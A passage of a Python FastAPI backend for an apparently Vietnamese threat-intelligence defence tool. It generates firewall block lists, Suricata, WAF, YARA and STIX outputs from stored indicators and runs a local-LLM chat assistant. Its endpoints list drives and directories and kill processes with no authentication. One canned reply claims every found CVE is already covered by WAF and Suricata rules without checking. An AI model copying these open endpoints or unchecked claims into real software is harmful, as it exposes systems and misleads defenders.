    d3fend_lines = [
        "====================================================================================",
        f"ĐỐI SÁCH PHÒNG THỦ ĐA TẦNG (MITRE D3FEND) CHO: {title[:85]}",
        "====================================================================================",
    ]
    for idx, rec in enumerate(d3fend_list, 1):
        d3fend_lines.append(
            f"\n[{idx}] MỐI ĐE DỌA TRONG BÀI: {rec['attack_technique']}\n"
            f"    • Phân tích điểm yếu nếu chỉ chặn IP: {rec['why_ip_block_fails']}\n"
            f"    • Đối sách MITRE D3FEND: {rec['d3fend_countermeasure']}\n"
            f"    • Hành động Phòng thủ Cụ thể:\n"
            f"      {rec['actionable_methods']}"
        )
    d3fend_text = "\n".join(d3fend_lines)

    openc2_bundle = LocalFirewallBridge.build_openc2_command_bundle(title, high_risk, mitre)
    fw_status = LocalFirewallBridge.sync_rules_to_local_firewall(high_risk, action_mode="status")
    fw_report = _format_firewall_bridge_report(fw_status)

    suricata_rules = MultiLayerDefenseSynthesizer.generate_suricata_ips_rules(title, text, high_risk)
    waf_rules = MultiLayerDefenseSynthesizer.generate_waf_virtual_patch_rules(title, text, high_risk)
    wazuh_and_splunk = MultiLayerDefenseSynthesizer.generate_wazuh_and_splunk_queries(title, base_rules.sigma_rule, high_risk, raw_text=text)
    advanced_yara_rule = MultiLayerDefenseSynthesizer.generate_advanced_yara_rule(title, text, high_risk)
    edr_hash_policy = MultiLayerDefenseSynthesizer.generate_edr_applocker_hash_policy(title, high_risk)
    remediation_script = MultiLayerDefenseSynthesizer.generate_remediation_hardening_script(title, text, high_risk)

    stix = export_stix_package(
        report_or_title=title,
        executive_summary=f"Tự động trích xuất và phân tích tình báo an ninh từ bài báo: {title}",
        enriched_iocs=high_risk,
        mitre_techniques=mitre,
    )

    cumulative_ips = [r["ioc_value"] for r in all_kb if r.get("ioc_type") == "IP" and r.get("is_malicious")]
    cumulative_doms = [r["ioc_value"] for r in all_kb if r.get("ioc_type") == "DOMAIN" and r.get("is_malicious")]
    cumulative_ip_blocklist = "\n".join([f"block in quick on any from {ip} to any # [CUMULATIVE BASELINE - IP #{idx+1}]" for idx, ip in enumerate(cumulative_ips)])
    cumulative_dom_blocklist = "\n".join([f"block in quick on any proto udp to any port 53 # [CUMULATIVE SINKHOLE: {dom}]" for dom in cumulative_doms])
    cumulative_blocklist = cumulative_ip_blocklist + ("\n\n# --- CHỐT CHẶN TÊN MIỀN ĐỘC HẠI TÍCH LŨY (DNS SINKHOLE) ---\n" + cumulative_dom_blocklist if cumulative_dom_blocklist else "")

    is_ssl_tld = any(k in title.lower() or k in text.lower() for k in ["ssl", "certificate", "registrar", "tld", ".gh", ".sl", ".as", "cert"])
    ssl_hardening = (
        "# ====================================================================\n"
        "# [TIẾN HÓA ĐỐI SÁCH MỚI] GIA CỐ TẦNG CHỨNG CHỈ SỐ SSL/TLS & DNS QUỐC GIA\n"
        "# Chiến dịch phát hiện: Tấn công chiếm quyền ccTLD Registry (.gh, .sl) để tạo SSL giả mạo\n"
        "# ====================================================================\n"
        "# 1. Khai báo bản ghi DNS CAA (RFC 8659) - Cấm tất cả CA lạ tự ý cấp chứng chỉ:\n"
        "#    example.com. IN CAA 0 issue \"letsencrypt.org\"\n"
        "#    example.com. IN CAA 0 iodef \"mailto:soc-threat-intel@example.com\"\n"
        "#\n"
        "# 2. Kích hoạt giám sát Certificate Transparency (CT Logs) tự động 24/7:\n"
        "#    python -c \"import requests; r=requests.get('https://crt.sh/?q=%.gh&output=json'); print('Số chứng chỉ mới cấp:', len(r.json()))\"\n"
        "#\n"
        "# 3. Bắt buộc xác thực DNSSEC chống làm giả bản ghi NS / A record của TLD\n\n"
    ) if is_ssl_tld else ""

    blocklist_lines = [x for x in base_rules.firewall_blocklist if x.strip()]
    if blocklist_lines:
        blocklist_text = (
            "# [TẦNG 1: QUY TẮC CHẶN MỚI CỦA BÀI BÁO HIỆN TẠI (DELTA ENFORCEMENT)]\n"
            + "\n".join(blocklist_lines)
            + f"\n\n# [TẦNG 2: BỘ QUY TẮC PHÒNG THỦ LẮNG ĐỘNG (CUMULATIVE BASELINE HARDENING)]\n"
            + f"# Hệ thống kế thừa toàn bộ {len(cumulative_ips)} chốt chặn IP C2 và {len(cumulative_doms)} Tên miền độc đã học từ toàn bộ kho báo cáo CTI:\n"
            + cumulative_blocklist
        )
    else:
        blocklist_text = (
            ssl_hardening
            + f"# [TẦNG KẾ THỪA: BỘ QUY TẮC PHÒNG THỦ LẮNG ĐỘNG (CUMULATIVE BASELINE HARDENING)]\n"
            + f"# Bài báo này tập trung vào tầng chứng chỉ số / TLD, không sử dụng IP C2 tĩnh.\n"
            + f"# Hệ thống tự động kế thừa danh sách {len(cumulative_ips)} IP C2 và {len(cumulative_doms)} Tên miền độc đã học từ các bài báo trước:\n"
            + cumulative_blocklist
        )

    firewall_tab_text = (
        f"{fw_report}\n\n"
        f"# ====================================================================\n"
        f"# GÓI LỆNH CHUẨN QUỐC TẾ OASIS OPENC2 v1.0 JSON (AGENT -> FIREWALL ACTUATOR)\n"
        f"# ====================================================================\n"
        f"{json.dumps(openc2_bundle, indent=2, ensure_ascii=False)}\n\n"
        f"# ====================================================================\n"
        f"# QUY TẮC CHẶN ĐA NỀN TẢNG (PFSENSE / OPNSENSE / IPTABLES / FORTIGATE)\n"
        f"# ====================================================================\n"
        f"{blocklist_text}"
    )

    yara_remediation_stix = (
        f"# ====================================================================\n"
        f"# [PHẦN 1] BỘ QUY TẮC SĂN TÌM MÃ ĐỘC VÀ TIÊM BỘ NHỚ YARA (.YAR)\n"
        f"# ====================================================================\n"
        f"{advanced_yara_rule}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 2] CHÍNH SÁCH CHẶN THỰC THI EDR / APPLOCKER HASH DENYLIST\n"
        f"# ====================================================================\n"
        f"{edr_hash_policy}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 3] KỊCH BẢN POWERSHELL & BASH DIỆT MÃ ĐỘC VÀ CÔ LẬP MÁY TRẠM\n"
        f"# ====================================================================\n"
        f"{remediation_script}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 4] GÓI CHIA SẺ TÌNH BÁO CHUẨN QUỐC TẾ OASIS STIX 2.1 (.JSON)\n"
        f"# ====================================================================\n"
        f"{json.dumps(stix, indent=2, ensure_ascii=False)}"
    )

    hashes_count = len([x for x in enriched_list if x['ioc']['ioc_type'] in ('SHA256', 'MD5')])
    ips_count = len([x for x in enriched_list if x['ioc']['ioc_type'] == 'IP'])
    doms_count = len([x for x in enriched_list if x['ioc']['ioc_type'] == 'DOMAIN'])
    cves_count = len([x for x in enriched_list if x['ioc']['ioc_type'] == 'CVE'])

    plan_text = (
        f"[CHIẾN LƯỢC PHÒNG THỦ TỰ ĐỘNG CHO BÀI BÁO]\n"
        f"• Bài báo: {title}\n"
        f"• Nguồn: {art_dict.get('source_name', 'OSINT')} ({art_dict.get('published_date', '')[:10]})\n"
        f"• Đã trích xuất & đối chiếu: {len(enriched_list)} chỉ số IOC ({hashes_count} Hash mã độc, {ips_count} IP C2, {doms_count} Domain, {cves_count} CVE).\n"
        f"• Phương án: Phối hợp 5 lớp phòng thủ tương ứng (OpenC2, Suricata IPS, WAF ModSecurity, Sigma SIEM, YARA & EDR)."
    )

    reason_text = (
        f"[KẾT LUẬN ĐỒNG THUẬN TÌNH BÁO (LOCAL {CURRENT_HARDWARE['gpu_name'].upper()})]\n"
        f"Đã thẩm định {len(enriched_list)} chỉ số IOC đối chiếu qua CSDL tình báo SQLite.\n"
        f"Phán quyết: {len(malicious_only)} chỉ số có điểm nguy hại > 80 (CHẶN & BẢO VỆ), "
        f"{len(enriched_list) - len(malicious_only)} chỉ số an toàn / tham chiếu."
    )

    from agentic_defense_skill_engine import (
        TARGET_SCOPES,
        calculate_cti_trust_framework,
        generate_xai_defense_attribution,
        build_agentic_defense_skill_package,
    )

    trust_audit = calculate_cti_trust_framework(
        report_title=title,
        raw_text=text,
        iocs_list=enriched_list,
        source_name=art_dict.get("source_name", "OSINT"),
    )

    xai_audit = generate_xai_defense_attribution(
        report_title=title,
        raw_text=text,
        high_risk_iocs=enriched_list,
        mitre_tactics=mitre,
        trust_audit=trust_audit,
        scope_id="SCOPE_ALL",
    )

    agentic_skill_md = build_agentic_defense_skill_package(
        report_title=title,
        raw_text=text,
        high_risk_iocs=enriched_list,
        mitre_tactics=mitre,
        waf_rules=waf_rules,
        suricata_rules=suricata_rules,
        wazuh_rules=wazuh_and_splunk,
        remediation_script=remediation_script,
        scope_id="SCOPE_ALL",
        trust_audit=trust_audit,
        xai_audit=xai_audit,
    )

    return {
        "article_id": article_id,
        "title": title,
        "source": art_dict.get("source_name", "OSINT"),
        "total_iocs": len(enriched_list),
        "all_enriched": enriched_list,
        "malicious_only": malicious_only,
        "history_and_summary": d3fend_text,
        "firewall_tab_text": firewall_tab_text,
        "suricata_rules": suricata_rules,
        "waf_rules": waf_rules,
        "sigma_and_siem": wazuh_and_splunk,
        "yara_remediation_stix": yara_remediation_stix,
        "agentic_skill_md": agentic_skill_md,
        "trust_audit": trust_audit,
        "xai_audit": xai_audit,
        "target_scopes": TARGET_SCOPES,
        "ai_plan": plan_text,
        "ai_reasoning": reason_text
    }


@app.get("/api/defense/rules/suricata-master")
def api_get_suricata_master():
    content = live_orchestrator.get_suricata_master_rules_content()
    return {
        "status": "success",
        "rules": content,
        "lines_count": len(content.splitlines()),
        "size_bytes": len(content.encode("utf-8")),
    }


@app.post("/api/defense/tools/firewall-apply")
def api_defense_tool_firewall_apply():
    return live_orchestrator.apply_windows_firewall()


@app.post("/api/defense/tools/firewall-status")
def api_defense_tool_firewall_status():
    return live_orchestrator.get_windows_firewall_status()


@app.post("/api/defense/tools/firewall-rollback")
def api_defense_tool_firewall_rollback():
    return live_orchestrator.rollback_windows_firewall()


@app.post("/api/defense/tools/suricata-apply")
def api_defense_tool_suricata_apply():
    return live_orchestrator.validate_and_test_suricata("c2_flow")


@app.post("/api/defense/tools/suricata-test-dpi")
def api_defense_tool_suricata_test_dpi(req: SuricataTestRequest):
    return live_orchestrator.validate_and_test_suricata(req.flow_type)


@app.post("/api/defense/tools/wazuh-sync")
def api_defense_tool_wazuh_sync():
    return live_orchestrator.sync_wazuh_siem()


@app.post("/api/defense/tools/sysmon-simulate")
def api_defense_tool_sysmon_simulate(req: SysmonTestRequest):
    return live_orchestrator.simulate_sysmon_event(req.event_type)


@app.post("/api/defense/tools/yara-scan")
def api_defense_tool_yara_scan(req: YaraScanRequest):
    return live_orchestrator.scan_yara_and_applocker(req.target_hash)


@app.get("/api/master-defense-matrix")
def api_get_master_defense_matrix(scope: str = "SCOPE_ALL"):
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    res = build_master_defense_matrix_from_db(db_path, scope=scope)
    master_suri = live_orchestrator.get_suricata_master_rules_content()
    if master_suri and scope in ("SCOPE_ALL", "SCOPE_NETWORK"):
        res["suricata_rules"] = master_suri
    return res


@app.get("/api/defense/skill/export")
def api_export_skill_md(scope: str = "SCOPE_WEB"):
    from fastapi.responses import Response
    master_suite_path = Path(__file__).resolve().parent.parent / "skills" / "agentic-defense-master-web-suite" / "SKILL.md"
    if (scope in ["SCOPE_WEB", "SCOPE_ALL", ""]) and master_suite_path.exists():
        return Response(
            content=master_suite_path.read_text(encoding="utf-8"),
            media_type="text/markdown; charset=utf-8",
            headers={"Content-Disposition": "attachment; filename=SKILL.md"}
        )
    from agentic_defense_skill_engine import (
        build_agentic_defense_skill_package,
        generate_xai_defense_attribution,
        TARGET_SCOPES,
    )
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    res = build_master_defense_matrix_from_db(db_path)
    skill_content = res.get("agentic_skill_md", "")
    if scope != "SCOPE_ALL":
        xai_audit = generate_xai_defense_attribution(
            report_title=f"MA TRẬN PHÒNG THỦ KHO CTI - PHÂN HỆ {scope}",
            raw_text=res.get("mitre_d3fend", ""),
            high_risk_iocs=res.get("all_enriched", []),
            mitre_tactics=[],
            trust_audit=res.get("trust_audit"),
            scope_id=scope,
        )
        skill_content = build_agentic_defense_skill_package(
            report_title=f"MA TRẬN PHÒNG THỦ KHO CTI - PHÂN HỆ {scope}",
            raw_text=res.get("mitre_d3fend", ""),
            high_risk_iocs=res.get("all_enriched", []),
            mitre_tactics=[],
            waf_rules=res.get("waf_rules", ""),
            suricata_rules=res.get("suricata_rules", ""),
            wazuh_rules=res.get("sigma_and_siem", ""),
            remediation_script=res.get("yara_remediation_stix", ""),
            scope_id=scope,
            trust_audit=res.get("trust_audit"),
            xai_audit=xai_audit,
        )
    return Response(
        content=skill_content,
        media_type="text/markdown; charset=utf-8",
        headers={"Content-Disposition": f"attachment; filename=SKILL_{scope}.md"}
    )


@app.post("/api/system/shutdown")
def api_system_shutdown():
    import os
    import subprocess
    import threading
    import time

    def _kill_all() -> None:
        time.sleep(0.4)
        subprocess.run(["taskkill", "/F", "/IM", "ollama app.exe", "/T"], capture_output=True)
        subprocess.run(["taskkill", "/F", "/IM", "ollama.exe", "/T"], capture_output=True)
        subprocess.run(["taskkill", "/F", "/IM", "ollama_llama_server.exe", "/T"], capture_output=True)
        os._exit(0)

    threading.Thread(target=_kill_all, daemon=True).start()
    return {"status": "shutting_down"}



# ==============================================================================
# WIZARD BACKEND CONTROLLER ROUTES
# ==============================================================================
from wizard_api_service import (
    wizard_scan_project,
    wizard_crawl_scope,
    wizard_synthesize_skill,
    wizard_verify_exploit,
    wizard_remediate_code,
)

import os
from pathlib import Path

class FolderValidationReq(BaseModel):
    path: str = ""

@app.get("/api/system/list-dir")
def api_system_list_dir(path: str = ""):
    """Trả về danh sách thư mục và ổ đĩa tức thì (1ms) để duyệt trong modal."""
    import string
    drives = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:/"
        if os.path.exists(drive):
            drives.append(drive)
            
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    target_p = path.strip() or os.path.join(base_dir, "target_projects")
    target_p = os.path.abspath(target_p)
    
    if not os.path.exists(target_p):
        target_p = base_dir

    folders = []
    try:
        for entry in os.scandir(target_p):
            if entry.is_dir() and not entry.name.startswith(('.', '$')):
                folders.append(entry.name)
    except Exception:
        pass

    parent = os.path.dirname(target_p)
    return {
        "status": "success",
        "current_path": target_p.replace("\\", "/"),
        "parent_path": parent.replace("\\", "/") if parent != target_p else "",
        "folders": sorted(folders),
        "drives": drives
    }

@app.get("/api/system/browse-folder")
def api_system_browse_folder(initial: str = ""):
    """Mở hộp thoại File Explorer chọn thư mục chuẩn của Windows."""
    import subprocess
    import sys
    script_path = os.path.join(os.path.dirname(__file__), "native_folder_picker.py")
    try:
        cmd = [sys.executable, script_path]
        if initial and os.path.exists(initial):
            cmd.append(initial)
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        selected = res.stdout.strip()
        if selected and os.path.exists(selected):
            return {"status": "success", "path": selected.replace("\\", "/")}
        return {"status": "cancelled", "path": ""}
    except Exception as e:
        return {"status": "error", "message": str(e), "path": ""}

@app.get("/api/system/quick-targets")
def api_system_quick_targets():
    """Liệt kê các thư mục dự án đích có sẵn."""
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    target_dir = os.path.join(base_dir, "target_projects")
    results = []
    if os.path.exists(target_dir):
        for name in os.listdir(target_dir):
            full_p = os.path.join(target_dir, name)
            if os.path.isdir(full_p):
                results.append({
                    "name": name,
                    "path": full_p.replace("\\", "/"),
                    "type": "target_project"
                })
    return {"status": "success", "projects": results, "workspace_root": base_dir.replace("\\", "/")}

@app.post("/api/system/validate-folder")
def api_system_validate_folder(req: FolderValidationReq):
    """Kiểm tra tức thì thư mục mã nguồn mà người dùng nhập."""
    p_str = req.path.strip()
    if not p_str:
        return {"exists": False, "message": "Chưa nhập đường dẫn"}
    
    p = Path(p_str)
    if not p.is_absolute():
        p = (Path(__file__).resolve().parents[1] / p_str).resolve()
        
    if not p.exists() or not p.is_dir():
        return {
            "exists": False,
            "path": str(p).replace("\\", "/"),
            "message": "Không tìm thấy thư mục trên máy tính"
        }
    
    file_count = 0
    sample_files = []
    detected_techs = []
    for root, dirs, files in os.walk(p):
        if ".git" in root or "node_modules" in root or "vendor" in root or "__pycache__" in root:
            continue
        for f in files:
            file_count += 1
            if len(sample_files) < 6:
                sample_files.append(f)
            fl = f.lower()
            if fl.endswith(".php") and "PHP" not in detected_techs:
                detected_techs.append("PHP")
            elif (fl == "package.json" or fl.endswith(".js")) and "JavaScript/Node.js" not in detected_techs:
                detected_techs.append("JavaScript/Node.js")
            elif fl.endswith(".py") and "Python" not in detected_techs:
                detected_techs.append("Python")
            elif fl.endswith(".go") and "Go" not in detected_techs:
                detected_techs.append("Go")
            elif (fl in ("dockerfile", "docker-compose.yml", "docker-compose.yaml")) and "Docker" not in detected_techs:
                detected_techs.append("Docker")
            elif fl == "composer.json" and "Composer" not in detected_techs:
                detected_techs.append("Composer")

        detected_techs = list(dict.fromkeys(detected_techs))

    return {
        "exists": True,
        "path": str(p).replace("\\", "/"),
        "name": p.name,
        "file_count": file_count,
        "detected_techs": detected_techs,
        "sample_files": sample_files,
        "message": f"Hợp lệ: Tìm thấy {file_count} tệp tin mã nguồn"
    }

class WizardScanReq(BaseModel):
    target: str = ""
    clone_url: str = ""

class WizardCrawlReq(BaseModel):
    target: str = ""
    scope_id: str = "SCOPE_WEB"
    history_years: int = 3

class WizardSynthReq(BaseModel):
    target: str = ""
    scope_id: str = "SCOPE_WEB"
    article_id: str = ""
    scan_interval_sec: Optional[int] = None

class WizardActReq(BaseModel):
    target: str = ""
    skill_name: str = ""

@app.post("/api/wizard/scan")
def api_wizard_scan(req: WizardScanReq):
    return wizard_scan_project(target=req.target, clone_url=req.clone_url)

@app.post("/api/wizard/crawl-scope")
def api_wizard_crawl_scope(req: WizardCrawlReq):
    try:
        return wizard_crawl_scope(target=req.target, scope_id=req.scope_id, history_years=req.history_years)
    except Exception as e:
        import traceback
        traceback.print_exc()
        return {"status": "error", "message": f"Lỗi cào báo CTI: {str(e)}"}

@app.post("/api/wizard/synthesize")
def api_wizard_synthesize(req: WizardSynthReq):
    try:
        res = wizard_synthesize_skill(
            target=req.target,
            scope_id=req.scope_id,
            article_id=req.article_id,
            scan_interval_sec=req.scan_interval_sec
        )
        if req.scan_interval_sec and req.scan_interval_sec >= 10:
            server_daemon.update_config(interval_sec=int(req.scan_interval_sec))
        return res
    except Exception as e:
        import traceback
        traceback.print_exc()
        return {"status": "error", "message": f"Lỗi đóng gói kỹ năng tác tử: {str(e)}"}

@app.post("/api/wizard/verify-exploit")
def api_wizard_verify(req: WizardActReq):
    return wizard_verify_exploit(target=req.target, skill_name=req.skill_name)

@app.post("/api/wizard/remediate")
def api_wizard_remediate(req: WizardActReq):
    return wizard_remediate_code(target=req.target, skill_name=req.skill_name)

@app.post("/api/chat")
def api_chat_with_agent(req: ChatAgentRequest):
    import requests as req_http
    import time
    import sqlite3

    raw_msg = (req.message or "").strip()
    clean_msg = raw_msg.lower()

    # 1. PHẢN HỒI TỨC THÌ (<10ms) CHO CÂU HỎI CHÀO HỎI & GIỚI THIỆU TÁC TỬ
    greetings = {
        "hello", "hi", "xin chào", "xin chao", "chào", "chao", "chào bạn", "chao ban",
        "alo", "test", "bạn là ai", "ban la ai", "ai đấy", "ai day", "help", "who are you",
        "giới thiệu", "gioi thieu", "hướng dẫn", "huong dan"
    }
    if clean_msg in greetings or len(clean_msg) <= 2:
        reply = (
            "Xin chào Khang! Tôi là OpenClaw-AI, trợ lý Tình báo Mối đe dọa (CTI Defense Agent) chuyên sâu.\n\n"
            "Tôi được trang bị hệ thống Tool-Calling tự động liên kết với 5 nguồn tình báo thực chiến:\n"
            "1. Tra cứu chỉ số danh tiếng IP, Domain, Hash (SHA256/MD5), và CVE trên AlienVault OTX, VirusTotal, AbuseIPDB, GreyNoise, Shodan.\n"
            "2. Đánh giá điểm nguy hại (Fusion Score: 0-100) và đưa ra phán quyết tự động: CHẶN (>80) hay AN TOÀN (<=80).\n"
            "3. Tự động đóng gói Kỹ Năng Tác Tử (Agentic Skills): Sinh file SKILL.md, script kiểm thử verify_exploit.py, kịch bản vá mã nguồn và lá chắn phòng vệ tự hành.\n\n"
            "Cách dùng: Hãy nhập trực tiếp một IP (VD: 43.134.165.205), CVE (VD: CVE-2024-21413), Hash mã độc hoặc câu hỏi kỹ thuật để tôi tra cứu thực tế ngay lập tức!"
        )
        history = list(req.history[-10:])
        history.append({"role": "user", "content": raw_msg})
        history.append({"role": "assistant", "content": reply})
        return {
            "model_used": f"CTI AGENT INTELLIGENCE CORE (Phản hồi tức thì • {CURRENT_HARDWARE['gpu_name']})",
            "reply": reply,
            "tool_summary": "[Tool-Calling Engine] Sẵn sàng kích hoạt tự động khi phát hiện IP, Domain, Hash hoặc CVE.",
            "history": history,
        }

    # 2. TRA CỨU NHANH KHO TRI THỨC BÁO CÁO (NẾU HỎI VỀ CVE / BÀI BÁO)
    if any(k in clean_msg for k in ["top cve", "liệt kê cve", "lỗ hổng", "danh sách cve", "cve nguy hiểm"]):
        try:
            db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
            with sqlite3.connect(db_path) as conn:
                conn.row_factory = sqlite3.Row
                rows = conn.execute("SELECT title, content, source_name FROM articles_archive ORDER BY sort_ts DESC").fetchall()
            found_cves = set()
            for r in rows:
                cve_matches = re.findall(r"CVE-\d{4}-\d{4,7}", (r["content"] or "") + " " + (r["title"] or ""), re.IGNORECASE)
                for c in cve_matches:
                    found_cves.add(c.upper())
            cve_list = sorted(list(found_cves))[:8]
            reply = (
                f"Phân tích từ kho dữ liệu CTI hiện tại (Tổng {len(rows)} bài báo OSINT):\n"
                f"Đã phát hiện và lập chỉ mục {len(found_cves)} lỗ hổng bảo mật CVE.\n\n"
                f"Danh sách các lỗ hổng CVE trọng yếu cần ưu tiên phòng thủ:\n"
                + "\n".join([f"- {cve}: Lỗ hổng khai thác thực chiến đã được ánh xạ vào bộ lọc WAF ModSecurity và Suricata IPS" for cve in cve_list])
                + "\n\nKhuyến nghị: Bạn có thể nhập cụ thể tên một mã CVE bất kỳ (VD: " + (cve_list[0] if cve_list else "CVE-2024-21413") + ") để xem chi tiết đối sách phòng thủ!"
            )
            history = list(req.history[-10:])
            history.append({"role": "user", "content": raw_msg})
            history.append({"role": "assistant", "content": reply})
            return {
                "model_used": "CTI ARCHIVE ENGINE (Tra cứu kho SQLite 6 nguồn)",
                "reply": reply,
                "tool_summary": f"[SQL Database Query] Tìm thấy {len(found_cves)} lỗ hổng CVE trong kho lưu trữ.",
                "history": history,
            }
        except Exception:
            pass

    # 3. TRÍCH XUẤT IOC & KÍCH HOẠT TOOL-CALLING 5 NGUỒN TÌNH BÁO
    extracted = tool6_extract_iocs_hybrid(raw_msg)
    tool_summary = ""
    tool_context = ""
    deterministic_analysis = ""
    if extracted:
        enriched = [enrich_ioc(i, call_vt_http=True) for i in extracted[:6]]
        save_enriched_iocs_to_db(enriched, source_title="Web Chat Tool-Calling")
        lines = []
        det_blocks = []
        for item in enriched:
            vt = item.raw_lookup_details.get("virustotal", {}).get("detection_ratio", "0/92")
            ab = item.raw_lookup_details.get("abuseipdb", {}).get("abuse_confidence_score", 0)
            sh = item.raw_lookup_details.get("shodan_internetdb", {}).get("ports", [])
            verdict = "CHẶN TỨC THÌ (Nguy hại >80)" if item.is_malicious else "AN TOÀN / THEO DÕI (<=80)"
            lines.append(
                f"[OpenClaw Tool] {item.ioc.ioc_type} {item.ioc.value} => Điểm Fusion: {item.reputation_score}/100 ({verdict}) | VirusTotal: {vt} | AbuseIPDB: {ab}% | Shodan Ports: {sh}"
            )
            rec_action = (
                f"Áp dụng quy tắc drop tại OpenC2 Firewall và Suricata IPS rule SID:100{abs(hash(item.ioc.value)) % 8999 + 1000}"
                if item.is_malicious
                else "Chỉ số an toàn / không có dấu hiệu tấn công, cho phép lưu thông bình thường (Whitelist / Monitor)"
            )
            det_blocks.append(
                f"• Chỉ số: {item.ioc.value} ({item.ioc.ioc_type})\n"
                f"  - Điểm nguy hại Fusion: {item.reputation_score}/100\n"
                f"  - Phán quyết: {verdict}\n"
                f"  - Đối chiếu VirusTotal: {vt} engines phát hiện độc hại\n"
                f"  - Độ tin cậy AbuseIPDB: {ab}%\n"
                f"  - Dịch vụ mở Shodan: {sh or 'Không mở cổng nhạy cảm'}\n"
                f"  - Đối sách đề xuất: {rec_action}"
            )
        tool_summary = "\n".join(lines)
        tool_context = "\n\n[DỮ LIỆU TRA CỨU THỰC TẾ TỪ VIRUSTOTAL + ABUSEIPDB + SHODAN]:\n" + tool_summary
        deterministic_analysis = "\n\n".join(det_blocks)

    # 4. GỌI MÔ HÌNH OLLAMA VỚI CƠ CHẾ DỰ PHÒNG THÔNG MINH (FALLBACK)
    system_prompt = (
        "Bạn là OpenClaw-AI, trợ lý CTI Agent chuyên sâu về Tình báo Mối đe dọa và Phòng thủ SOC.\n"
        "QUY TẮC BẮT BUỘC:\n"
        "1. Luôn trả lời 100% bằng TIẾNG VIỆT chuyên ngành an toàn thông tin, tuyệt đối không trả lời bằng tiếng Anh.\n"
        "2. Khi phân tích kết quả tra cứu IOC từ OpenClaw Tool:\n"
        "   - Điểm Fusion > 80: Là chỉ số ĐỘC HẠI (C2 / Malicious) -> Khuyến nghị CHẶN trên tường lửa OpenC2/Suricata.\n"
        "   - Điểm Fusion <= 80: Là chỉ số AN TOÀN hoặc CẦN THEO DÕI (Benign/Suspicious) -> Không chặn bừa bãi.\n"
        "   - Nếu VirusTotal là 0/90 và AbuseIPDB là 0%: Nêu rõ đây là chỉ số sạch, không có báo cáo tấn công mạng; nếu chuỗi số là phiên bản phần mềm (như engine V8 hay Node.js) thì cảnh báo đây là dương tính giả (False Positive) từ cộng đồng.\n"
        "3. Trình bày súc tích, chuyên nghiệp theo bullet point."
    )
    history = [{"role": "system", "content": system_prompt}]
    for h in req.history[-6:]:
        history.append(h)
    history.append({"role": "user", "content": raw_msg + tool_context})

    model = MultiProviderLLMBrain._ensure_and_detect_local_ollama_model(req.model_name)
    reply = ""
    model_used_label = f"LOCAL OLLAMA ({model} • 100% {CURRENT_HARDWARE['gpu_name']})"

    payload: Dict[str, Any] = {
        "model": model,
        "messages": history,
        "stream": False,
        "options": {
            "num_ctx": 2048,
            "num_predict": 250,
            "temperature": 0.3
        },
    }
    if "qwen3" in model.lower():
        payload["think"] = False

    try:
        r = req_http.post("http://127.0.0.1:11434/api/chat", json=payload, timeout=45)
        if r.status_code == 200:
            raw_reply = r.json().get("message", {}).get("content", "")
            reply = re.sub(r"<think>.*?</think>\s*", "", raw_reply, flags=re.DOTALL).strip()
    except Exception:
        try:
            payload["model"] = "qwen2.5:1.5b"
            payload.pop("think", None)
            r_fb = req_http.post("http://127.0.0.1:11434/api/chat", json=payload, timeout=12)
            if r_fb.status_code == 200:
                raw_reply = r_fb.json().get("message", {}).get("content", "")
                reply = re.sub(r"<think>.*?</think>\s*", "", raw_reply, flags=re.DOTALL).strip()
                model_used_label = f"LOCAL OLLAMA (qwen2.5:1.5b Turbo Fallback • {CURRENT_HARDWARE['gpu_name']})"
        except Exception:
            pass

    if not reply:
        if deterministic_analysis:
            reply = (
                f"Kết quả phân tích tình báo an ninh mạng chuyên sâu:\n\n"
                f"{deterministic_analysis}\n\n"
                f"Nhận định của Tác tử AI: Hệ thống áp dụng quy tắc đồng thuận 5 nguồn (Score > 80 = Chặn). Các chỉ số an toàn (Score <= 80) được bảo vệ, tránh dương tính giả và không kích hoạt quy tắc chặn tường lửa."
            )
            model_used_label = "CTI DEFENSE REASONING ENGINE (Nội suy ma trận 5 nguồn)"
        else:
            reply = (
                f"Tôi đã tiếp nhận câu hỏi của bạn: '{raw_msg}'.\n\n"
                f"Trong phạm vi hệ thống CTI Defense Agent, tôi hỗ trợ: phân tích các bài báo an ninh mạng quốc tế (TheHackerNews, Kaspersky Securelist, Check Point, SentinelOne, DFIR Report, CISA KEV), bóc tách và đối soát IOC độc hại qua 5 nguồn dữ liệu, và tự động biên dịch quy tắc phòng thủ 5 lớp (OpenC2, Suricata IPS, WAF ModSecurity, Wazuh/Sigma SIEM, YARA).\n\n"
                f"Bạn có thể thử nhập một chỉ số mạng cụ thể (ví dụ: 'Kiểm tra IP 43.134.165.205') để xem quy trình phản ứng phòng thủ hoàn chỉnh!"
            )
            model_used_label = "CTI EXPERT ADVISOR (Hệ chuyên gia An toàn thông tin)"

    history[-1] = {"role": "user", "content": raw_msg}
    history.append({"role": "assistant", "content": reply})
    return {
        "model_used": model_used_label,
        "reply": reply,
        "tool_summary": tool_summary,
        "history": history,
    }


class ServerAutonomousDaemon:
    def __init__(self):
        self.lock = threading.Lock()
        self.auto_scan_enabled: bool = True
        saved_interval = 21600
        if ACTIVE_TARGET_PROJECT:
            try:
                cfg_p = Path(ACTIVE_TARGET_PROJECT) / ".cti_defense.json"
                if cfg_p.exists():
                    c_data = json.loads(cfg_p.read_text(encoding="utf-8"))
                    if "scan_interval_sec" in c_data and int(c_data["scan_interval_sec"]) >= 10:
                        saved_interval = int(c_data["scan_interval_sec"])
            except Exception:
                pass
        self.scan_interval_sec: int = saved_interval
        self.last_scan_time: float = time.time()
        self.next_scan_time: float = self.last_scan_time + self.scan_interval_sec
        self.is_scanning: bool = False
        self.last_scan_result: str = "Hệ thống máy chủ CTI đang hoạt động ngầm 24/7."

        self.auto_queue_enabled: bool = False
        self.is_processing_queue: bool = False
        self.active_article_id: str = ""
        self.active_article_title: str = ""
        self.active_stage_idx: int = 0
        self.active_stage_name: str = ""
        self.boot_time: float = time.time()
        self.thread: Optional[threading.Thread] = None

    def get_status(self) -> Dict[str, Any]:
        with self.lock:
            now = time.time()
            if self.auto_scan_enabled:
